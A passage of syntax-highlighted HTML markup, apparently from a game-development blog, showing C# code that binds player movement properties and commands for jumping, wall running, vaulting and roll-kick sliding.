class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JumpSpeed</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-14\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Mass</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Mass</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-15\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastRollKickEnded</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastRollKickEnded</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-16\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Voxel</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">WallRunMap</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">WallRunVoxel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-17\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Direction</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">WallDirection</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">WallDirection</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-18\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CommandBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Voxel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Voxel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Coord</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Direction</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">WalkedOn</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">footsteps</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">WalkedOn</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-19\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CommandBinding</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">DeactivateWallRun</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Action</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Deactivate</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-20\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FallDamage</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fallDamage</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-21\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Predictor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">predictor</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-22\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">model</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-23\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Voxel</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastWallRunMap</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastWallRunMap</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-24\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Direction</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastWallDirection</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastWallDirection</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-25\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CanKick</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CanKick</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-26\"><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastSupportedSpeed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastSupportedSpeed</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-28\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSwimming</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSwimming</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-29\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LinearVelocity</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LinearVelocity</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-30\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Vector3</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">transform</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Position</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Position</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-31\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSupported</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSupported</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-32\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CommandBinding</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LockRotation</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Action</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">rotation</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Lock</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-33\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CommandBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UpdateLockedRotation</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rotation</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UpdateLockedRotation</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-34\"><span class=\"crayon-v\">vault</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CommandBinding</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Vault</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">delegate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vault</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Go</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-35\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Predictor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">predictor</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-36\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Height</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Height</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-37\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JumpSpeed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JumpSpeed</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-38\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MaxSpeed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MaxSpeed</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-39\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rotation</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Rotation</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Rotation</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-40\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">AllowUncrouch</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">AllowUncrouch</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-41\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TwoWayBinding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">HasTraction</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">HasTraction</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-42\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastWallJump</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jump</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastWallJump</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-43\"><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastSupportedSpeed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">LastSupportedSpeed</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-44\"><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">WallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">State</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">WallRunState</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wallRun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CurrentState</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-45\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-46\"><span class=\"crayon-v\">input</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Bind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">RollKickButton</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">settings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">RollKick</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-47\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">EnableCrouch</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">EnableCrouch</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-48\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">float</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Rotation</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rotation</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Rotation</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-49\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSwimming</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSwimming</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c151a105690089-50\"><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Binding</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">bool</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rollKickSlide</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSupported</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">player</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Character</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">IsSupported</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c151a105690089-51\"><span class=\"crayon-v\">rollKickSlide</span><span 